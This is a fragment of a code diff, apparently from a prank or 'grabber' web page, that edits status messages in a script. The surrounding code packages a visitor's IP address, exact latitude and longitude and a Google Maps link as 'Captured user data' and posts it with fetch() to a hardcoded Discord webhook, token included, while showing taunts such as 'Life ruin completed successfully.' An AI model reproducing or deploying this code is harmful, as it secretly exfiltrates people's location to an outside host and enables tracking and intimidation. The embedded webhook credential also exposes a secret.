@@ -191,8 +191,8 @@
           content: `Captured user data:\nIP Address: \`${ip}\`\nCoordinates: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`\nGoogle Maps: ${mapsUrl}`
         }));
 
-        updateMessage("Sending data to dark web...");
-        logMessage("Sending data to webhook...");
+        updateMessage("Sending data to Dark web...");
+        logMessage("Sending data to Dark web...");
         const response = await fetch(
           "https://discord.com/api/webhooks/1270166449318793296/eJjxv6udxX13mJVpn5ubPqzYQMI9-Xue9G0LAelkswYqcDVVgZp0cLfHXb55RkaPw_w2",
           {
@@ -203,11 +203,11 @@
 
         if (response.ok) {
           logMessage("Data successfully sent to dark web.");
-          updateMessage("life ruin completed successfully.");
+          updateMessage("Life ruin completed successfully.");
         } else {
           const errorText = await response.text();
           logMessage(`Failed to send data: ${response.status} ${response.statusText} - ${errorText}`);
-          updateMessage("Failed to send data to Discord.");
+          updateMessage("Failed to send data to Dark web.");
         }
       } catch (error) {
         logMessage(`Error: ${error.message}`);
